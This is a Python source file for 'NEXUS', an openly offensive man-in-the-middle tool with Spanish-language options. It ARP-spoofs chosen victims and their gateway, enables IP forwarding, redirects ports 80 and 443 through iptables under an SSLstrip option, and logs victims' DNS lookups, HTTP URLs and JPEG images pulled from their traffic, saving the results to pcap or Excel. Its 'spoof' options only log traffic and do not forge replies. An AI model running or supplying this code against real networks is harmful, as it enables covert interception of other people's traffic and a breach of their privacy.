#!/usr/bin/env python3

import argparse
import os
import sys
import time
import io
import subprocess
import socket
import pandas as pd
from threading import Thread, Event
from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNSQR
from scapy.layers.l2 import ARP
from tkinter import Tk, Label
from PIL import Image, ImageTk

BANNER = r"""
███    ██ ███████ ██   ██ ██    ██ ███████ 
████   ██ ██       ██ ██  ██    ██ ██      
██ ██  ██ █████     ███   ██    ██ ███████ 
██  ██ ██ ██       ██ ██  ██    ██      ██ 
██   ████ ███████ ██   ██  ██████  ███████ 
                                           
                                            

        MITM Sniffing Tool - NEXUS
"""

def apply_color(text, color):
    colors = {
        'negro': '\033[30m', 'rojo': '\033[31m', 'verde': '\033[32m', 'amarillo': '\033[33m',
        'azul': '\033[34m', 'magenta': '\033[35m', 'cyan': '\033[36m', 'blanco': '\033[37m',
        'naranja': '\033[38;5;214m', 'rosa': '\033[38;5;219m', 'lila': '\033[38;5;93m',
        'oliva': '\033[38;5;102m', 'marrón': '\033[38;5;94m', 'aqua': '\033[38;5;43m',
        'plata': '\033[38;5;242m', 'dorado': '\033[38;5;226m', 'rojo_oscuro': '\033[38;5;88m',
        'verde_oscuro': '\033[38;5;22m', 'azul_oscuro': '\033[38;5;19m',
        'end': '\033[0m'
    }
    if color not in colors:
        return text
    return re.sub(r"(\[.*?\])", f"{colors[color]}\\1{colors['end']}", text)

def get_prefix():
    return "\033[30;43m[ arpsoof ]\033[0m: \033[92m⟩⟩⟩\033[0m"

parser = argparse.ArgumentParser(
    description="NEXUS - MITM Sniffing and Spoofing Tool",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("--ifaces", action="store_true", help="Listar interfaces de red disponibles")
parser.add_argument("-i", "--interface", help="Interfaz de red a utilizar (requerido)")
parser.add_argument("-t", "--target", nargs=2, metavar=('VICTIMA', 'GATEWAY'), help="Par de direcciones IP: víctima y gateway")
parser.add_argument("-l", "--list-targets", help="Archivo de texto con IPs objetivo (una por línea)")
parser.add_argument("-f", "--format", help="Guardar salida en formato Excel (.xlsx, .xls, .xml, etc.)")
parser.add_argument("-I", "--img", action="store_true", help="Capturar imágenes desde tráfico HTTP")
parser.add_argument("--gui", action="store_true", help="Mostrar imágenes capturadas en una ventana gráfica")
parser.add_argument("-o", "--output", help="Directorio de salida para guardar archivos capturados")
parser.add_argument("-p", "--pcap", help="Nombre del archivo .pcap para guardar tráfico capturado")
parser.add_argument("--dns-spoof", action="store_true", help="Activar spoofing DNS")
parser.add_argument("--http-spoof", action="store_true", help="Activar spoofing HTTP")
parser.add_argument("--sslstrip", action="store_true", help="Activar SSLstrip (requiere iptables y redirección de puertos)")
parser.add_argument("--set-colors", choices=[
    "negro", "rojo", "verde", "amarillo", "azul", "magenta", "cyan", "blanco",
    "naranja", "rosa", "lila", "oliva", "marrón", "aqua", "plata", "dorado",
    "rojo_oscuro", "verde_oscuro", "azul_oscuro"
], help="Color para los valores entre [ ] en la salida")
args = parser.parse_args()

if args.ifaces:
    print("Interfaces disponibles:")
    for iface in get_if_list():
        print(f" - {iface}")
    sys.exit(0)

stop_event = Event()
captured_packets = []
excel_data = []

if args.gui:
    gui_root = Tk()
    gui_root.title("Captura de Imágenes")
    label = Label(gui_root)
    label.pack()

def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[+] IP Forwarding habilitado")

def start_sslstrip():
    print("[+] Iniciando SSL Stripping (redirigiendo 443 a 80)...")
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "10000"])

def stop_sslstrip():
    print("[!] Restaurando iptables...")
    subprocess.call(["iptables", "-t", "nat", "-F"])

def arp_spoof(victim_ip, gateway_ip, iface):
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)
    attacker_mac = get_if_hwaddr(iface)

    if not victim_mac or not gateway_mac:
        print("[!] Error obteniendo MACs")
        sys.exit(1)

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print(f"[+] Attacker MAC: {attacker_mac}")

    arp_to_victim = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
    arp_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)

    try:
        while not stop_event.is_set():
            sendp(arp_to_victim, iface=iface, verbose=0)
            sendp(arp_to_gateway, iface=iface, verbose=0)
            print("[+] Enviando paquetes ARP spoof...")
            time.sleep(2)
    except Exception as e:
        print(f"[!] Error en ARP spoof: {e}")
    finally:
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        if args.sslstrip:
            stop_sslstrip()
        print("[!] Spoofing detenido.")

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):
    sendp(Ether(dst=victim_mac) / ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac), count=5, iface=iface, verbose=0)
    sendp(Ether(dst=gateway_mac) / ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac), count=5, iface=iface, verbose=0)

def display_image(data):
    try:
        image = Image.open(io.BytesIO(data))
        photo = ImageTk.PhotoImage(image)
        label.config(image=photo)
        label.image = photo
        gui_root.update()
    except:
        pass

def packet_callback(packet):
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        prefix = "\033[30;43m[ arpsoof ]\033[0m: \033[92m⟩⟩⟩\033[0m"

        if args.dns_spoof and packet.haslayer(DNSQR):
            try:
                domain = packet[DNSQR].qname.decode(errors="ignore")
                dns_ip = socket.gethostbyname(domain.strip('.'))
                text = f"{src_ip} >> {dst_ip}  Address: [{dns_ip}]  dns >> [{domain}]"
                colored_text = apply_color(text, args.set_colors)
                print(f"{prefix} {colored_text}")
                excel_data.append({"Source": src_ip, "Destination": dst_ip, "Type": "DNS", "Domain": domain, "Resolved IP": dns_ip})
            except:
                pass

        elif args.http_spoof and packet.haslayer(HTTPRequest):
            try:
                host = packet[HTTPRequest].Host.decode()
                path = packet[HTTPRequest].Path.decode()
                dns_ip = socket.gethostbyname(host)
                text = f"{src_ip} >> {dst_ip}  Address: [{dns_ip}]  http://{host}{path}"
                colored_text = apply_color(text, args.set_colors)
                print(f"{prefix} {colored_text}")
                excel_data.append({"Source": src_ip, "Destination": dst_ip, "Type": "HTTP", "URL": f"http://{host}{path}", "Resolved IP": dns_ip})
            except:
                pass

    if args.img and packet.haslayer(Raw):
        payload = packet[Raw].load
        if b"Content-Type: image" in payload:
            start = payload.find(b'\xff\xd8')
            end = payload.find(b'\xff\xd9') + 2
            if start != -1 and end != -1:
                image_data = payload[start:end]
                if args.gui:
                    display_image(image_data)

    captured_packets.append(packet)

    captured_packets.append(packet)

def main():
    print(BANNER)
    if os.geteuid() != 0:
        print("[!] Ejecutar como root.")
        sys.exit(1)

    if not args.interface:
        print("[!] Debes especificar una interfaz.")
        sys.exit(1)

    enable_ip_forwarding()

    if args.sslstrip:
        start_sslstrip()

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list_targets:
        if not os.path.isfile(args.list_targets):
            print(f"[!] Archivo no encontrado: {args.list_targets}")
            sys.exit(1)
        with open(args.list_targets) as f:
            for line in f:
                ip = line.strip()
                if ip:
                    targets.append((ip, args.target[1] if args.target else ''))

    if not targets:
        print("[!] No hay objetivos definidos.")
        sys.exit(1)

    for victim_ip, gateway_ip in targets:
        print(f"[+] Objetivo: {victim_ip} → Gateway: {gateway_ip}")
        t = Thread(target=arp_spoof, args=(victim_ip, gateway_ip, args.interface))
        t.daemon = True
        t.start()

    print("[+] Sniffing... (Ctrl+C para detener)")
    try:
        sniff(iface=args.interface, prn=packet_callback, store=True)
    except KeyboardInterrupt:
        print("\n[!] Captura detenida.")
        stop_event.set()

    if args.pcap:
        path = os.path.join(args.output or ".", args.pcap)
        wrpcap(path, captured_packets)
        print(f"[+] Captura guardada en: {path}")

    if args.format:
        full_path = os.path.join(args.output or ".", args.format)
        df = pd.DataFrame(excel_data)
        df.to_excel(full_path, index=False)
        print(f"[+] Resultados exportados a: {full_path}")

    if args.gui:
        gui_root.mainloop()

if __name__ == "__main__":
    main()
